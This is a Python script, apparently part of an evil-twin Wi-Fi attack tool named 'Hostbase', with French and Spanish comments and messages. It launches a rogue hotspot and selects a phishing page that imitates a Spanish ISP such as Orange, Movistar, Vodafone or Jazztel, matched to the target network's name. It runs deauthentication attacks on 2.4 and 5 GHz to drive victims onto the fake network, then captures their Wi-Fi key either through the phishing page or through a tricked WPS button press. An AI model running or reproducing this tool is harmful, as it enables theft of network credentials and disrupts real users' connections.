import os
import re
import time
import signal
import subprocess
import sys
from signal import SIGINT, SIGTERM, sigwait
from pathlib import Path

# Script working with python >= 3.10

YELLOW = "\033[33m"
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
RESET = "\033[0m"




with open("hostapdcarte", "r") as ct:
 carte = ct.read()
with open("ssid.txt", "r") as es:
 ssid = es.read()

astucessid = " "

print(f"{RESET}Configuracion de hostapd...")
os.system("rm -rf /etc/dhcpd.conf")
hostapdfile = "hostapd.conf"

# KALI : BERATE-AP A METTRE AU LIEU DE LA CONF HOSTAPD
# Écriture sommaire dans le fichier hostapd.conf
# astucessid a changer par " " si jamais l'espace n'est pas pris en compte dans la commande (équiv : ruby shellwords)
with open(hostapdfile, "w+") as file:
    file.write("interface=%s" % carte + "\n" + "driver=nl80211" + "\n" + "ssid=%s" % ssid + astucessid + "\n" + "hw_mode=g" + "\n" + "ieee80211n=1" + "\n" + "channel=3")

os.system("hostapd -K hostapd.conf &> /dev/null &")
time.sleep(5)
os.system("rm -rf /etc/dhcpd.conf")
os.system("killall dhcpd")
os.system("cp -R WebPages/dhcpd.conf .")
# Il y a juste une ligne à changer dans le fichier dhcpd.conf donc plutot que de tout réecrire on la remplace juste
with open('dhcpd.conf', 'r') as file:
  filedata = file.read()

filedata = filedata.replace('interface', 'interface' + " " + carte + ';')

with open('dhcpd.conf', 'w') as file:
 file.write(filedata)
os.system("echo > /etc/dhcpd.leases")
time.sleep(1)
os.system("cp -R dhcpd.conf /etc/")
time.sleep(1)
os.system("rm -rf dhcpd.conf")
os.system("dhcpd -d -f -lf /etc/dhcpd.leases -cf /etc/dhcpd.conf &")
time.sleep(3)
vieuxscript = subprocess.Popen("bash berate.sh", shell=True)  # passage en bash ici car problème avec les sondes NCSI et le code en python

with open('pagina', 'r') as p:
 pageflag = p.read()

 if '0' in pageflag:
     print(f"{YELLOW}Modo WPA : la pagina de phishing pedira de entrar la clave wifi")
     flag = 'wpa3'
 else:
     print(f"{YELLOW}Modo WPS : la pagina de phishing pedira de apoyar el boton WPS")
     flag = 'wps'
     os.system("cp -R WebPages/wpa_supplicant.conf .")


print(f"{RESET}Buscando la buena pagina de phishing...")
if 'MiFibra' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
elif 'miF' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
elif 'mif' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
elif 'MOVISTAR' in ssid:
  print('Configuracion del hotspot...')
  print('movistar' + flag)
  page = 'movistar' + flag
  with open('page.txt', 'w') as f:
      f.write("movistar" + flag)
elif 'mov' in ssid:
  print('Configuracion del hotspot...')
  print('movistar' + flag)
  page = 'movistar' + flag
  with open('page.txt', 'w') as f:
      f.write("movistar" + flag)
elif 'Mov' in ssid:
  print('Configuracion del hotspot...')
  print('movistar' + flag)
  page = 'movistar' + flag
  with open('page.txt', 'w') as f:
      f.write("movistar" + flag)
elif 'vodafone' in ssid:
  print('Configuracion del hotspot...')
  print('vodafone' + flag)
  page = 'vodafone' + flag
  with open('page.txt', 'w') as f:
      f.write("vodafone" + flag)
elif 'Voda' in ssid:
  print('Configuracion del hotspot...')
  print('vodafone' + flag)
  page = 'vodafone' + flag
  with open('page.txt', 'w') as f:
      f.write("vodafone" + flag)
elif 'Livebox' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
  print(page)
elif 'livebox' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
elif 'LIVEBOX' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
elif 'Orange' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
elif 'orange' in ssid:
  print('Configuracion del hotspot...')
  print('orange' + flag)
  page = 'orange' + flag
  with open('page.txt', 'w') as f:
      f.write("orange" + flag)
elif 'ONO' in ssid:
  print('Configuracion del hotspot...')
  print('vodafone' + flag)
  page = 'vodafone' + flag
  with open('page.txt', 'w') as f:
      f.write("vodafone" + flag)
elif 'OnO' in ssid:
  print('vodafone' + flag)
  page = 'vodafone' + flag
  with open('page.txt', 'w') as f:
      f.write("vodafone" + flag)
elif 'ono' in ssid:
  print('Configuracion del hotspot...')
  print('vodafone' + flag)
  page = 'vodafone' + flag
  with open('page.txt', 'w') as f:
      f.write("vodafone" + flag)
elif 'jazztel' in ssid:
  print('Configuracion del hotspot...')
  print('jazztel' + flag)
  page = 'jazztel' + flag
  with open('page.txt', 'w') as f:
      f.write("jazztel" + flag)
elif 'Jazztel' in ssid:
  print('Configuracion del hotspot...')
  print('jazztel' + flag)
  page = 'jazztel' + flag
  with open('page.txt', 'w') as f:
      f.write("jazztel" + flag)
elif 'JazzTel' in ssid:
  print('Configuracion del hotspot...')
  print('jazztel' + flag)
  page = 'jazztel' + flag
  with open('page.txt', 'w') as f:
      f.write("jazztel" + flag)
else:
     print(f"{RED}No se ha podido encontrar la buena pagina de phishing...")
     print(f"{YELLOW}Entonces no pasa nada : se va a usar la pagina 404 por defecto...")
     print(f"{CYAN}Eso significa que usted no usa Hostbase en espana...")
     print(f"{MAGENTA}...O... ese error viene cuando el nombre de la red no corresponde a los nombres habituales... ")
     print(f"{GREEN}De toda manera... la pagina de phishing 404 ha sido selectionado.")
     print(f"{GREEN}Siguiendo... algunos errores van a aparecer en la consola con ese nuevo paso pero son falsos positivos...")
     print(f"{RESET}404 selected...")
     page = '404'
     flag = 'wpa3'
     with open('page.txt', 'w') as f:
         f.write("404" + flag)





# Reste à faire :
# Copie des fake pages + droits sur le serveur apache
# iptables + dhcpd + dnspoof  (pas utile si utilisation de berate_ap
# Deauth
# Attente WPS + attente clé
# Affichage à l'écran des deux


time.sleep(35)  # Attente que le hotspot soit lancé dans berate.rb avant de balancer la deauth
if flag == 'wpa3':
    print('modo wpa')
else:
    print('modo wps')

# Lancement de la deauth en 2.4Ghz ou 5GHz en meme temps selon la conf détectée (mettre dans un thread ou subprocess)

ghz = 0

if os.path.isfile('cinqgcarte'):
   with open("cinqgcarte", "r") as c:
        cinq = c.read()

   with open("deuxgcarte", "r") as d:
        deux = d.read()
   print("Iniciando modo monitor en las tarjetas wifi...")
   os.system("rfkill unblock all")
   os.system("ip link set" + " " + cinq + " " + "down")
   os.system("iw dev" + " " + cinq + " " + "set type monitor")
   time.sleep(3)
   os.system("ip link set" + " " + cinq + " " + "up")
   time.sleep(3)
   os.system("ip link set" + " " + deux + " " + "down")
   os.system("iw dev" + " " + deux + " " + "set type monitor")
   time.sleep(3)
   os.system("ip link set" + " " + deux + " " + "up")
   time.sleep(3)
   print("Iniciando la deauth (2.4GHz/5GHz) al mismo tiempo...")
   os.system("wmctrl -r :ACTIVE: -b remove,fullscreen")
   dos = subprocess.Popen("python rundos.py", shell=True)
   time.sleep(1)
   ghzdos = subprocess.Popen("python rundoscinqg.py", shell=True)
   print("Iniciando wash...")
   wash = subprocess.Popen("python wash.py", shell=True)
   time.sleep(1)
   ghz = 1
else:
    print("Iniciando modo monitor en la otra tarjeta wifi...")
    with open("deuxgcarte", "r") as d:
        deux = d.read()
    os.system("ip link set" + " " + deux + " " + "down")
    os.system("iw dev" + " " + deux + " " + "set type monitor")
    time.sleep(3)
    os.system("ip link set" + " " + deux + " " + "up")
    time.sleep(3)
    os.system("wmctrl -r :ACTIVE: -b remove,fullscreen")
    print('Iniciando la deauth en 2.4GHz...')
    dos = subprocess.Popen("python rundos.py", shell=True)
    print("Iniciando wash...")
    wash = subprocess.Popen("python wash.py", shell=True)
    time.sleep(1)

if flag == 'wpa3':
    print("Modo wpa detectado : parando wash... no lo necesitamos para este modo...")
    wash.terminate()
    wash.wait()
    wash.kill()
    cle = subprocess.Popen("python attack4.py", shell=True)
    sys.exit()
else:
 print(f"{CYAN}Esperamos a la victima... press CTRL+C una vez para quitar...")
while not os.path.exists('wash.txt'):
    time.sleep(1)

if os.path.isfile('wash.txt'):
    print('')
else:
    raise ValueError("%s isn't a file!" % 'wash.txt')
while True:
    if 'wps_selected_registrar' in open("wash.txt").read():
        break
    time.sleep(1)
else:
    raise ValueError("%s isn't a file!" % file_path)

print(f"{GREEN}Un usario se ha conectado y ha apoyado el boton WPS... parada de la deauth...")
print(f"{RESET}Stopping el ataque deauth ...")
wash.terminate()
wash.wait()
wash.kill()
dos.terminate()
dos.wait()
dos.kill()
if ghz == 1:
    ghzdos.terminate()
    ghzdos.wait()
    ghzdos.kill()
else:
    None


print('Iniciando wpa_cli...')
with open("bssid.txt", "r") as b:
    bssid = b.read()
os.system("ip link set" + " " + deux + " " + "down")
os.system("iw dev" + " " + deux + " " + "set type managed")
time.sleep(3)
os.system('rfkill unblock all')
os.system("ip link set" + " " + deux + " " + "up")
time.sleep(5)
os.system('killall wpa_supplicant')
os.system('rm -rf /etc/wpa_supplicant.conf')
os.system('cp -R wpa_supplicant.conf /etc/')
os.system("sudo wpa_supplicant -B -Dnl80211 -i" + deux + " " + "-c/etc/wpa_supplicant.conf")


with open("bssid.txt", "r") as b:
    bssid = b.read()

starttime = time.monotonic()
while True:
    os.system("xterm -e wpa_cli wps_pbc" + " " + bssid)
    time.sleep(20.0 - ((time.monotonic() - starttime) % 20.0))
    if 'WPA' in open("/etc/wpa_supplicant.conf").read():
        break

print(f"{GREEN}KEY FOUND !")
with open("/etc/wpa_supplicant.conf", "r") as k:
    key = k.read()
    print(key)
    print(f"{RESET}Guardamos la clave wifi en la carpeta home...")
    os.system('cp -R /etc/wpa_supplicant.conf /home/')
    print("Done.")

print(f"{CYAN}Quitando Hostbase...")
exitscript = subprocess.Popen("python exit.py", shell=True)
sys.exit()
# exit de tout les process plus effacemment des fichier txt et csv, restart ne network manager



